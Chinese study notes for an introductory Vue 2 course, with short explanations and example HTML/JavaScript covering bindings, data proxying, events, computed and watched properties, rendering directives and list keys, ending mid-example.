# 课程简介

null

# Vue简介

- 1.声明式编程

- 2.虚拟`DOM`:`Virtual-DOM`

- 2.`diff`算法:通过`diff`算法将新生成的虚拟`DOM`与已存在的虚拟`DOM`进行比较

# Vue官网使用指南

# 搭建Vue开发环境

1. Vue的两种安装方式:
   - npm安装
   - script引入
2. Vue的两个版本:
   - 开发版:包含警告
   - 生产版本:不包含警告等功能

```javascript
Vue.config.productionTip = false//阻止vue在启动时生成生产提示
```

# Hello案例

**icon图标:**

1. 想让Vue工作,就必须创建一个Vue实例,且要传入一个配置对象
2. root容器里的代码依然符合html规范,只不过混入了一些特殊的Vue语法
3. root容器里的代码被称为Vue模板
4. Vue实例和容器是一一对应的
5. 真实开发中只有一个Vue实例,并且会配合着组件一起使用
6. {{xxx}}中的xxx要写js表达式,且xxx可以自动读取到data中的所有属性
7. 一旦data中的数据发生改变,那么页面中用到该数据的地方也会自动更新

```javascript
Vue.config.productionTip = false//阻止vue在启动时生成生产提示
new Vue({//创建Vue实例
  el:"#root",//el用于指定当前Vue实例为哪个容器服务,值通常为css选择器字符串
  data:{//data:用于存储数据，数据功el所指定的容器去使用，值我们暂时先写成一个对象
    name:"Maaya"
 }
```

# 分析Hello案例

1. 容器与Vue实例之间只能是一对一的对应关系
2. 注意区分JS表达式和JS代码(语句):JS表达式是一种特殊的JS代码
   1. 表达式:一个表达式会产生一个值,可以放在任何一个需要值的地方
      - a
      - a+b
      - demo(1)
      - x === y ? 'a' : 'b'
   2. .js代码(语句)
      - if(){}
      - for(){}

```html
<div class="root">
  <h1>Hello,{{name.toUpperCase()}},{{address}}</h1><!-- {{}}中的代码必须写成JS类表达式 -->
</div>
```

```javascript
Vue.config.productionTip = false
new Vue({
  el:".root",
  data:{
    name:"Maaya",
    address:"厦门"
  }
})
```

# 模板语法

1. 插值语法
   - 功能: 用于解析标签体内容
   - 写法: {{xxx}},xxx是js表达式,且可以直接读取到data中的所有属性
2. 指令语法
   - 功能: 用于解析标签（包括：标签属性、标签体内容、绑定事件.....）
   - 举例: v-bind:href="xxx"或简写为:href="xxx",xxx同样要写js表达式,且可以直接读取到data中的所有属性
   - 备注: Vue中有很多的指令,且形式都是:v-????,此处只是拿v-bind举个例子

```html
<div id="root">
  <h1>插值语法</h1>
  <h3>你好，{{name}}</h3>
  <hr />
  <h1>指令语法</h1>
	<!-- v-bind:将herf和school.url进行单向绑定 -->
  <a v-bind:href="school.url.toUpperCase()" x="hello">点我去{{school.name}}学习1</a>
  <a :href="school.url" x="hello">点我去{{school.name}}学习2</a>
</div>
```

```javascript
Vue.config.productionTip = false //阻止vue在启动时生成生产提示。
new Vue({
  el: 'root',
  data: {
    name: 'jack',
    school: {
      name: '尚硅谷',
      url: 'http://www.atguigu.com',
    }
  }
})
```

# 数据绑定

1. Vue中有2种数据绑定的方式：
   - 单向绑定(v-bind)：数据只能从data流向页面。
   - 双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。
2. 备注：
   - 双向绑定一般都应用在表单类元素上（如：input、select等）
   - v-model:value可以简写为v-model，因为v-model默认收集的就是value值。

```html
<div id="root">
  单向数据绑定:<input type="text" :value="name">
  <br/>
  双向数据绑定:<input type="text" v-model="name">
  <!-- 如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上 -->
  <!-- <h2 v-model:x="name">你好啊</h2> -->
</div>
```

```javascript
Vue.config.productionTip = false //阻止vue在启动时生成生产提示
new Vue({
  el: "root",
  data: {
    name: "Maaya"
  }
})
```

# el与data的两种写法

data与el的2种写法:

1. el有2种写法
   - `new Vue`时候配置el属性。
   - 先创建Vue实例，随后再通过vm.$mount('root')指定el的值。
2. data有2种写法,目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。
   - 对象式
   - 函数式
3. 一个重要的原则：由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了。

```html
<div id="root">
  <h1>你好,{{name}}</h1>
</div>
```

```javascript
Vue.config.productionTip = false//阻止vue在启动时生成生产提示
const v = new Vue({
  //el:'root',第一种写法
  /* data:{//data的第一种写法:对象式
				name:'尚硅谷'
		 }, */
  data: function () {//第二种写法:函数式,但是不能使用箭头函数
    console.log("this的指向", this)
    return {
      name: "尚硅谷"
    }
  }
})
v.$mount("root")//第二种写法:挂载
```

# 理解MVVM

MVVM模型

- M：模型(Model)：data中的数据
- V：视图(View) ：模板代码
- VM：视图模型(ViewModel)：Vue实例

观察发现：

- data中所有的属性，最后都出现在了vm身上。
- vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。

```html
<div id="root">
  <h1>学校名称：{{name}}</h1>
  <h1>学校地址：{{address}}</h1>
  <!-- <h1>测试一下1：{{1+1}}</h1>
	<h1>测试一下2：{{$options}}</h1>
	<h1>测试一下3：{{$emit}}</h1>
	<h1>测试一下4：{{_c}}</h1> -->
</div>
```

```javascript
const vm = new Vue({
  el:'root',
  data:{
    name:'尚硅谷',
    address:'北京',
  }
})
console.log(vm)
```

# Object.defineproperty

```javascript
Vue.config.productionTip = false //阻止vue在启动时生成生产提示
let number = 18
let person = {
  name: "Maaya",
  male: "Female"
}
Object.defineProperty(person, "age", {//通过此方法添加的属性无法被枚举:即无法被遍历
  /* value:18,
		 enumerable:true,//控制此属性是否可以枚举，默认值是false
		 writable:true,//控制此属性是否可以在控制台等其它位置被修改，默认值是false
		 configurable:true//控制此属性是否可以被删除，默认值是false */

  //当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
  get() {//本行正常非缩写写法: get:function(){
    console.log('有人读取age属性了')
    return number
  },
  //当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
  set(value) {
    console.log('有人修改了age属性，且值是', value)
    number = value
  }
})
console.log(person);
console.log(Object.keys(person));//遍历方法1
for (let key in person) {//遍历方法2:将person的键名遍历到key中
  console.log("@", person[key]);//可理解为person.name
}
```

# 理解数据代理

数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）

```javascript
Vue.config.productionTip = false //阻止开发版vue在启动时生成生产提示
let obj = { x: 100 }
let obj2 = { y: 200 }
Object.defineProperty(obj2, 'x', {//使用obj2代理obj的x属性
  get() {
    return obj.x
  },
  set(value) {
    obj.x = value
  }
})
```

# Vue中的数据代理

1. Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读/写）
2. Vue中数据代理的好处：更加方便的操作data中的数据
3. 基本原理：
   - 通过Object.defineProperty()把data对象中所有属性添加到vm上。
   - 为每一个添加到vm上的属性，都指定一个getter/setter。
   - 在getter/setter内部去操作（读/写）data中对应的属性。

```html
<div id="root">
  <h2>学校名称：{{name}}</h2>
  <h2>学校地址：{{address}}</h2>
</div>
```

```javascript
Vue.config.productionTip = false //阻止vue在启动时生成生产提示
let data = {
  name:"尚硅谷",
  address:"科技园
}
const vm = new Vue({//给新创建的Vue实例上传一个配置对象参数,所以data.name不存在
  el: 'root',
  data
})
console.log(vm);
```

![](D:\OneDrive\Vue\1\13.Vue中的数据代理.png)

# 事件处理

事件的基本使用:

- 使用v-on:xxx或 @xxx 绑定事件，其中xxx是事件名；
- 事件的回调需要配置在methods对象中，最终也会在vm上；
- methods中配置的函数，不要用箭头函数!否则this就不是vm了；
- methods中配置的函数，都是被Vue所管理的函数，this的指向是vm或组件实例对象；
- @click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；

```html
<div id="root">
  <h2>欢迎来到{{name}}学习</h2>
  <!-- <button v-on:click="showInfo">点我提示信息</button> -->
  <button @click="showInfo1">点我提示信息1（不传参）</button>
  <button @click="showInfo2($event,66)">点我提示信息2（传参）</button>
</div>
```

```javascript
const vm = new Vue({
  el:'root',
  data:{
    name:'尚硅谷',
  },
  methods:{
    showInfo1(event){
      console.log(event.target.innerText) //拿到调用此函数的目标元素的文本
      console.log(this === vm) //此处的this是vm
      alert('同学你好！')
    },
    showInfo2(event,number){
      console.log(event,number)
      // console.log(event.target.innerText)//event.button是触发此事件调用的标签button
      // console.log(this) //此处的this是vm
      alert('同学你好！！')
    }
  }
```

# 事件修饰符

Vue中的事件修饰符:修饰符可以连续写

- prevent：阻止默认事件（常用）；
- stop：阻止事件冒泡（常用）;冒泡是由里向外传递
- once：事件只触发一次（常用）；
- capture：使用事件的捕获模式；事件的捕获是从外向里传递
- self：只有event.target是当前操作的元素时才触发事件；
- passive：事件的默认行为立即执行，无需等待事件回调执行完毕

scroll:是滚动框的滚动;wheel:是鼠标滚轮的滚动,即使到底了也能继续滚动

```html
<div id="root">
  <h2>欢迎来到{{name}}学习</h2>
  <!-- 阻止默认事件（常用） -->
  <a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>

  <!-- 阻止事件冒泡（常用） -->
  <div class="demo1" @click="showInfo">
    <button @click.stop="showInfo">点我提示信息</button>
    <!-- 修饰符可以连续写 -->
    <!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
  </div>

  <!-- 事件只触发一次（常用） -->
  <button @click.once="showInfo">点我提示信息</button>

  <!-- 使用事件的捕获模式 -->
  <div class="box1" @click.capture="showMsg(1)">
    div1
    <div class="box2" @click="showMsg(2)">
      div2
    </div>
  </div>

  <!-- 只有event.target是当前操作的元素时才触发事件； -->
  <div class="demo1" @click.self="showInfo">
    <button @click="showInfo">点我提示信息</button>
  </div>

  <!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； -->
  <ul @wheel.passive="demo" class="list">
    <li>1</li>
    <li>2</li>
    <li>3</li>
    <li>4</li>
  </ul>

</div>
```

```javascript
new Vue({
  el:'root',
  data:{
    name:'尚硅谷'
  },
  methods:{
    showInfo(e){
      alert('同学你好！')
      // console.log(e.target)
    },
    showMsg(msg){
      console.log(msg)
    },
    demo(){
      for (let i = 0; i < 100000; i++) {
        console.log('')
      }
      console.log('累坏了')
    }
  }
})
```

# 键盘事件

1. Vue中常用的按键别名

```
回车 => enter
删除 => delete (捕获“删除”和“退格”键)
退出 => esc
空格 => space
换行 => tab (特殊，必须配合keydown去使用)
上 => up
下 => down
左 => left
右 => right
```

1. Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）
2. 系统修饰键（用法特殊）：ctrl、alt、shift、meta(win)
3. 也可以使用keyCode去指定具体的按键（不推荐）
   - 配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发
   - 合keydown使用：正常触发事件
4. Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名

```html
<div id="root">
  <h2>欢迎来到{{name}}学习</h2>
  <input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
</div>
```

```javascript
Vue.config.keyCodes.huiche = 13 //定义了一个别名按键
new Vue({
  el:'root',
  data:{
    name:'尚硅谷'
  },
  methods: {
    showInfo(e){
      // console.log(e.key,e.keyCode)
      /* if(e.keycode !== 13) return */
      console.log(e.target.value)
    }
  },
})
```

# 事件总结

```html
<div id="root">
  <div class="demo1" @click="showInfo">
    <!-- 事件修饰符可以复合使用:先停止冒泡再阻止默认行为 -->
    <a href="https://www.baidu.com" @click.stop.prevent="showInfo">点我提示信息</a>
  </div>

  <div id="root">
    <h2>欢迎来到{{name}}学习</h2>
    <!-- 键盘事件复合:按住ctrl后并按住y -->
    <input type="text" placeholder="按下回车提示输入" @keyup.ctrl.y="showInfo1">
  </div>
</div>
```

```javascript
new Vue({
  el:"root",
  data:{
    name:"Maaya"
  },
  methods:{
    showInfo(e){
      alert("姐姐欸")
    },
    showInfo1(e){
      console.log(e.target.value);
    }
  }
})
```

# 姓名案例

## 姓名案例_插值语法实现

```html
<div id="root">
  姓：<input type="text" v-model="firstName"> <br/><br/><!-- 使用v-model进行双向绑定 -->
  名：<input type="text" v-model="lastName"> <br/><br/>
  全名：<span>{{firstName.slice(0,3)}}-{{lastName}}</span><!-- slice():姓的值只截取前三位 -->
```

```javascript
new Vue({
  el:'root',
  data:{
    firstName:'张',
    lastName:'三'
  }
})
```

## 姓名案例_method实现

```html
<div id="root">
  姓：<input type="text" v-model="firstName"> <br/><br/><!-- 使用v-model进行双向绑定 -->
  名：<input type="text" v-model="lastName"> <br/><br/>
  全名：<span>{{fullName()}}</span>
</div>
```

```javascript
new Vue({
  el:'root',
  data:{
    firstName:'张',
    lastName:'三'
  },
  methods:{
    fullName(){
      return this.firstName + '-' + this.lastName
    }
  }
})
```

# 姓名案例_计算属性实现

计算属性:

- 定义：要用的属性不存在，要通过已有属性计算得来;这里的属性不能是脱离vm实例存在,修改a并不会导致页面变化
- 原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
- get函数什么时候执行？
  1. 初次读取时会执行一次。
  2. 当依赖的数据发生改变时会被再次调用。
- 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
- 备注：
  1. 计算属性最终会出现在vm上，直接读取使用即可。
  2. 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。

```html
<div id="root">
  姓：<input type="text" v-model="firstName"> <br/><br/>
  名：<input type="text" v-model="lastName"> <br/><br/>
  测试：<input type="text" v-model="x"> <br/><br/>
  全名：<span>{{fullName}}</span> <br/><br/>
  <!-- 全名：<span>{{fullName}}</span> <br/><br/>
	全名：<span>{{fullName}}</span> <br/><br/>
	全名：<span>{{fullName}}</span> -->
</div>
```

```javascript
let a = 10
const vm = new Vue({
  el:'root',
  data:{
    firstName:'张',
    lastName:'三',
    x:'你好'
  },
  methods: {
    demo(){

    }
  },
  computed:{
    fullName:{
      //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
      //get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
      get(){
        console.log('get被调用了')
        // console.log(this) //此处的this是vm
        return this.firstName + '-' + this.lastName + a 
      },
      //set什么时候调用? 当fullName被修改时。通过对vm.fullName重新赋值可以修改
      set(value){
        console.log('set',value)
        const arr = value.split('-')//split():将数组按照参数进行拆分
        this.firstName = arr[0]
        this.lastName = arr[1]
      }
    }
  }
})
```

# 姓名案例_计算属性简写

只有当计算属性只读不写的时候才能简写

```html
<div id="root">
  姓：<input type="text" v-model="firstName"> <br/><br/>
  名：<input type="text" v-model="lastName"> <br/><br/>
  全名：<span>{{fullName}}</span> <br/><br/>
</div>
```

```javascript
const vm = new Vue({
  el:'root',
  data:{
    firstName:'张',
    lastName:'三',
  },
  computed:{
    //完整写法
    /* fullName:{
					get(){
						console.log('get被调用了')
						return this.firstName + '-' + this.lastName
					},
					set(value){
						console.log('set',value)
						const arr = value.split('-')
						this.firstName = arr[0]
						this.lastName = arr[1]
					}
				} */
    //简写
    fullName(){
      console.log('get被调用了')
      return this.firstName + '-' + this.lastName
    }
  }
})
```

# 天气案例

```html
<div id="root">
  <h2>今天天气很{{info}}</h2>
  <!-- 绑定事件的时候：@xxx="yyy" yyy可以写一些简单的语句 -->
  <!-- <button @click="isHot = !isHot">切换天气</button> -->
  <button @click="changeWeather">切换天气</button>
</div>
```

```javascript
const vm = new Vue({
  el:'root',
  data:{
    isHot:true,
  },
  computed:{
    info(){
      return this.isHot ? '炎热' : '凉爽'
    }
  },
  methods: {
    changeWeather(){
      this.isHot = !this.isHot
    }
  },
})
```

# 天气案例_监视属性

监视属性watch:

- 当被监视的属性变化时,回调函数自动调用,进行相关操作
- 监视的属性必须存在，才能进行监视,但监视不存在的属性也不会报错
- 监视的两种写法：
  1. new Vue时传入watch配置
  2. 通过vm.$watch监视

```html 
<div id="root">
  <h2>今天天气很{{info}}</h2>
  <button @click="changeWeather">切换天气</button>
</div>
```

```javascript
const vm = new Vue({
  el:'root',
  data:{
    isHot:true,
  },
  computed:{
    info(){
      return this.isHot ? '炎热' : '凉爽'
    }
  },
  methods: {
    changeWeather(){
      this.isHot = !this.isHot
    }
  },
  /* watch:{//监视属性1
				isHot:{//isHot为简写形式:"isHot"(非简写要带引号)
					immediate:true, //初始化时让handler调用一下
					//handler什么时候调用？当isHot发生改变时。
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				}
			} */
})
//监视属性2
vm.$watch('isHot',{
  immediate:true, //初始化时让handler调用一下
  //handler什么时候调用？当isHot发生改变时。
  handler(newValue,oldValue){
    console.log('isHot被修改了',newValue,oldValue)
  }
})
```

# 天气案例_深度监视

- 深度监视:
  1. Vue中的watch默认不监测对象内部值的改变（一层）
  2. 配置deep:true可以监测对象内部值改变（多层）
- 备注:
  1. Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以
  2. 使用watch时根据数据的具体结构，决定是否采用深度监视

```html
<div id="root">
  <h2>今天天气很{{info}}</h2>
  <button @click="changeWeather">切换天气</button>
  <hr/>
  <h3>a的值是:{{numbers.a}}</h3>
  <button @click="numbers.a++">点我让a+1</button>
  <h3>b的值是:{{numbers.b}}</h3>
  <button @click="numbers.b++">点我让b+1</button>
  <button @click="numbers = {a:666,b:888}">彻底替换掉numbers</button>
  {{numbers.c.d.e}}
</div>
```

```javascript
const vm = new Vue({
  el:'root',
  data:{
    isHot:true,
    numbers:{
      a:1,
      b:1,
      c:{
        d:{
          e:100
        }
      }
    }
  },
  computed:{
    info(){
      return this.isHot ? '炎热' : '凉爽'
    }
  },
  methods: {
    changeWeather(){
      this.isHot = !this.isHot
    }
  },
  watch:{
    isHot:{
      // immediate:true, //初始化时让handler调用一下
      //handler什么时候调用？当isHot发生改变时。
      handler(newValue,oldValue){
        console.log('isHot被修改了',newValue,oldValue)
      }
    },
    //监视多级结构中某个属性的变化
    /* 'numbers.a':{
					handler(){
						console.log('a被改变了')
					}
				} */
    //监视多级结构中所有属性的变化
    numbers:{
      deep:true,
      handler(){
        console.log('numbers改变了')
      }
    }
  }
})
```

# 天气案例_监视属性的缩写

```html
<div id="root">
  <h2>今天天气很{{info}}</h2>
  <button @click="changeWeather">切换天气</button>
</div>
```

```javascript
const vm = new Vue({
  el: 'root',
  data: {
    isHot: true,
  },
  computed: {
    info() {
      return this.isHot ? '炎热' : '凉爽'
    }
  },
  methods: {
    changeWeather() {
      this.isHot = !this.isHot
    }
  },
  watch: {
    //正常写法
    /* isHot:{
					// immediate:true, //初始化时让handler调用一下
					// deep:true,//深度监视
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				}, */
    //简写
    /* isHot(newValue,oldValue){
					console.log('isHot被修改了',newValue,oldValue,this)
				} */
  }
})

//正常写法
/* vm.$watch('isHot',{
			immediate:true, //初始化时让handler调用一下
			deep:true,//深度监视
			handler(newValue,oldValue){
				console.log('isHot被修改了',newValue,oldValue)
			}
		}) */

//简写
/* vm.$watch('isHot',(newValue,oldValue)=>{
			console.log('isHot被修改了',newValue,oldValue,this)
		}) */
```

# 姓名案例_监视属性实现

- computed和watch之间的区别:
  1. computed能完成的功能，watch都可以完成
  2. watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作
- 两个重要的小原则:
  1. 被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象
  2. 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，这样this的指向才是vm 或 组件实例对象

```html
<div id="root">
  姓：<input type="text" v-model="firstName"> <br/><br/>
  名：<input type="text" v-model="lastName"> <br/><br/>
  全名：<span>{{fullName}}</span> <br/><br/>
</div>
```

```javascript
const vm = new Vue({
  el:'root',
  data:{
    firstName:'张',
    lastName:'三',
    fullName:'张-三'
  },
  watch:{//重点理解this的指向 
    firstName(val){
      setTimeout(()=>{
        console.log(this)
        this.fullName = val + '-' + this.lastName
      },1000);
    },
    lastName(val){
      this.fullName = this.firstName + '-' + val
    }
  }
})
```

# 绑定样式1

# 绑定样式2

绑定样式:

1. class样式:class="xxx";xxx可以是字符串、对象、数组
   1. 字符串写法适用于：类名不确定，要动态获取
   2. 对象写法适用于：要绑定多个样式，个数不确定，名字也不确定
   3. 数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用
2. style样式:font-size等带"-"符号的样式名须采用驼峰写法;fontSize
   1. :style="{fontSize: xxx}"其中xxx是动态值
   2. :style="[a,b]"其中a、b是样式对象

```html
<div id="root">
  <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 -->
  <div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>
  <!-- 绑定class样式--数组写法:将数组中的所有元素添加为class样式 -->
  <div class="basic" :class="classArr">{{name}}</div> <br/><br/>
  <!-- 绑定class样式--对象写法：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
  <div class="basic" :class="classObj">{{name}}</div> <br/><br/>
  <!-- 绑定style样式--对象写法,不常用 -->
  <div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
  <!-- 绑定style样式--数组写法,不常用 -->
  <div class="basic" :style="styleArr" >{{name}}</div>
</div>
```

```javascript
const vm = new Vue({
  el:'root',
  data:{
    name:'尚硅谷',
    mood:'normal',
    classArr:['atguigu1','atguigu2','atguigu3'],//数组中的元素须加引号,因为这样才是表达式
    classObj:{
      atguigu1:false,
      atguigu2:false,
    },
    styleObj:{
      fontSize: '40px',
      color:'red',
    },
    styleObj2:{
      backgroundColor:'orange'
    },
    styleArr:[
      {
        fontSize: '40px',
        color:'blue',
      },
      {
        backgroundColor:'gray'
      }
    ]
  },
  methods: {
    changeMood(){
      const arr = ['happy','sad','normal']
      const index = Math.floor(Math.random()*3)
      this.mood = arr[index]
    }
  },
})
```

# 条件渲染

条件渲染:

1. v-if:写法
   - v-if="表达式"
   - v-else-if="表达式"
   - v-else="表达式"
   - 适用于切换频率较低的场景
   - 特点：不展示的DOM元素直接被移除
   - 注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”
2. v-show:写法
   1. v-show="表达式"
   2. 适用于切换频率较高的场景
   3. 特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉
3. 备注:使用v-if时，因为对应元素被删除,所以可能无法获取到，而使用v-show一定可以获取到

```html
<h2>当前的n值是:{{n}}</h2>
<button @click="n++">点我n+1</button>
<!-- 使用v-show做条件渲染 -->
<!-- <h2 v-show="false">欢迎来到{{name}}</h2> -->
<!-- <h2 v-show="1 === 1">欢迎来到{{name}}</h2> -->

<!-- 使用v-if做条件渲染 -->
<!-- <h2 v-if="false">欢迎来到{{name}}</h2> -->
<!-- <h2 v-if="1 === 1">欢迎来到{{name}}</h2> -->

<!-- v-else和v-else-if -->
<!-- <div v-if="n === 1">Angular</div>
<div v-else-if="n === 2">React</div>
<div v-else-if="n === 3">Vue</div>
<div v-else>哈哈</div> -->

<!-- v-if与template的配合使用:template被隐藏时,h2也被隐藏-->
<template v-if="n === 1">
  <h2>你好</h2>
  <h2>尚硅谷</h2>
  <h2>北京</h2>
</template>
```

```javascript
const vm = new Vue({
  el:'root',
  data:{
    name:'尚硅谷',
    n:0
  }
})
```

# 列表渲染

v-for指令:

1. 用于展示列表数据
2. 语法：``v-for="(item, index) in xxx" :key="yyy"``
3. 可以遍历:数组、对象、字符串（用的少）、指定次数（用的少）

```html
<div id="root">
  <!-- 遍历数组:1.元素,2.索引 -->
  <h2>人员列表（遍历数组）</h2>
  <ul>
    <li v-for="(p,index) of persons" :key="index">
      {{p.name}}-{{p.age}}
    </li>
  </ul>
  <!-- 遍历对象:1.键值,2.键名 -->
  <h2>汽车信息（遍历对象）</h2>
  <ul>
    <li v-for="(value,k) of car" :key="k">
      {{k}}-{{value}}
    </li>
  </ul>
  <!-- 遍历字符串:1.字符串值,2.索引 -->
  <h2>测试遍历字符串（用得少）</h2>
  <ul>
    <li v-for="(char,index) of str" :key="index">
      {{char}}-{{index}}
    </li>
  </ul>

  <!-- 遍历指定次数:1.索引,2.值 -->
  <h2>测试遍历指定次数（用得少）</h2>
  <ul>
    <li v-for="(number,index) of 5" :key="index">
      {{index}}-{{number}}
    </li>
  </ul>
</div>
```

```javascript
new Vue({
  el:'root',
  data:{
    persons:[
      {id:'001',name:'张三',age:18},
      {id:'002',name:'李四',age:19},
      {id:'003',name:'王五',age:20}
    ],
    car:{
      name:'奥迪A8',
      price:'70万',
      color:'黑色'
    },
    str:'hello'
  }
})
```

# key作用与原理1

面试题:react与vue中的key有什么作用?(key的内部原理)

1. 虚拟DOM中key的作用:
   1. key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】
   2. 随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下
2. 对比规则:
   1. 从旧虚拟DOM中找到了与新虚拟DOM相同的key:
      1. 若旧虚拟DOM中内容没变, 直接使用之前的真实DOM
      2. 若旧虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM
   2. 旧虚拟DOM中未找到与新虚拟DOM相同的key:创建新的真实DOM，随后渲染到到页面
3. 用index作为key可能会引发的问题:
   1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作;会产生没有必要的真实DOM更新,虽然界面效果没问题, 但效率低
   2. 如果结构中还包含输入类的DOM:会产生错误DOM更新,导致界面有问题
4. 开发中如何选择key:
   1. 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值
   2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示, 使用index作为key是没有问题的

```html
<div id="root">
  <!-- 遍历数组 -->
  <h2>人员列表（遍历数组）</h2>
  <button @click.once="add">添加一个老刘</button>
  <ul>
    <li v-for="(p,index) of persons" :key="index"><!-- 遍历出persons数组中的对象和该对象的index -->
      {{p.name}}-{{p.age}}
      <input type="text">
    </li>
  </ul>
</div>
```

```javascript
new Vue({
  el: 'root',
  data: {
    persons: [
      { id: '001', name: '张三', age: 18 },
      { id: '002', name: '李四', age: 19 },
      { id: '003', name: '王五', age: 20 }
    ]
  },
  methods: {
    add() {
      const p = { id: '004', name: '老刘', age: 40 }
      this.persons.unshift(p)//插入到数组第一位
    }
  },
})
```

![30.key作用与原理](D:\OneDrive\Vue\1\30.key作用与原理.png)

# 列表过滤

```html
<div id="root">
  <h2>人员列表</h2>
  <input type="text" placeholder="请输入名字" v-model="keyWord">
  <ul>
    <li v-for="(p,index) of filPerons" :key="index">
      {{p.name}}-{{p.age}}-{{p.sex}}
    </li>
  </ul>
</div>
```

```javascript
//watch实现
new Vue({
  el:'root',
  data:{
    keyWord:'',
    persons:[
      {id:'001',name:'马冬梅',age:19,sex:'女'},
      {id:'002',name:'周冬雨',age:20,sex:'女'},
      {id:'003',name:'周杰伦',age:21,sex:'男'},
      {id:'004',name:'温兆伦',age:22,sex:'男'}
    ],
    filPerons:[]
  },
  watch:{
    keyWord:{
      immediate:true,//初始加载
      handler(val){
        this.filPerons = this.persons.filter((p)=>{
          return p.name.indexOf(val) !== -1
        })
      }
    }
  }
})
```

```javascript
//computed实现
new Vue({
  el:'root',
  data:{
    keyWord:'',
    persons:[
      {id:'001',name:'马冬梅',age:19,sex:'女'},
      {id:'002',name:'周冬雨',age:20,sex:'女'},
      {id:'003',name:'周杰伦',age:21,sex:'男'},
      {id:'004',name:'温兆伦',age:22,sex:'男'}
    ]
  },
  computed:{
    filPerons(){
      return this.persons.filter((p)=>{
        //当keyword为""时,任何字符串都包含它,但是不包含" ",因为二者不同
        return p.name.indexOf(this.keyWord) !== -1//判断p.name是否包含keyword的值,不存在返回-1,存在则返回其所处位置的index
      })
    }
  }
}) 
```

# 列表排序

```html
<div id="root">
  <h2>人员列表</h2>
  <input type="text" placeholder="请输入名字" v-model="keyWord">
  <button @click="sortType = 2">年龄升序</button>
  <button @click="sortType = 1">年龄降序</button>
  <button @click="sortType = 0">原顺序</button>
  <ul>
    <li v-for="(p,index) of filPerons" :key="p.id">
      {{p.name}}-{{p.age}}-{{p.sex}}
      <input type="text">
    </li>
  </ul>
</div>
```

```javascript
new Vue({
  el:'root',
  data:{
    keyWord:'',
    sortType:0, //0原顺序 1降序 2升序
    persons:[
      {id:'001',name:'马冬梅',age:30,sex:'女'},
      {id:'002',name:'周冬雨',age:31,sex:'女'},
      {id:'003',name:'周杰伦',age:18,sex:'男'},
      {id:'004',name:'温兆伦',age:19,sex:'男'}
    ]
  },
  computed:{
    filPerons(){
      const arr = this.persons.filter((p)=>{
        return p.name.indexOf(this.keyWord) !== -1
      })
      //判断一下是否需要排序
      if(this.sortType){
        arr.sort((p1,p2)=>{
          return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
        })
      }
      return arr
    }
  }
}) 
```

# 更新时的一个问题

[1.36].vue检测数据改变的原理_数组

# vue检测数据的原理_对象

```javascript
let data = {
  name: '尚硅谷',
  address: '北京',
}
const obs = new Observer(data)//创建一个监视的实例对象，用于监视data中属性的变化
console.log(obs)
let vm = {}//准备一个vm实例对象
vm._data = data = obs
function Observer(obj) {
  const keys = Object.keys(obj)//汇总对象中所有的属性形成一个数组
  keys.forEach((k) => {//遍历
    Object.defineProperty(this, k, {
      get() {
        return obj[k]
      },
      set(val) {
        console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
        obj[k] = val
      }
    })
  })
}
```

# vue.set()方法

```html
<div id="root">
  <h1>学校信息</h1>
  <h2>学校名称：{{school.name}}</h2>
  <h2>学校地址：{{school.address}}</h2>
  <h2>校长是：{{school.leader}}</h2>
  <hr/>
  <h1>学生信息</h1>
  <button @click="addSex">添加一个性别属性，默认值是男</button>
  <h2>姓名：{{student.name}}</h2>
  <h2 v-if="student.sex">性别：{{student.sex}}</h2>
  <h2>年龄：真实{{student.age.rAge}}，对外{{student.age.sAge}}</h2>
  <h2>朋友们</h2>
  <ul>
    <li v-for="(f,index) in student.friends" :key="index">
      {{f.name}}--{{f.age}}
    </li>
  </ul>
</div>
```

```javascript
const vm = new Vue({
			el:'root',
			data:{
				school:{
					name:'尚硅谷',
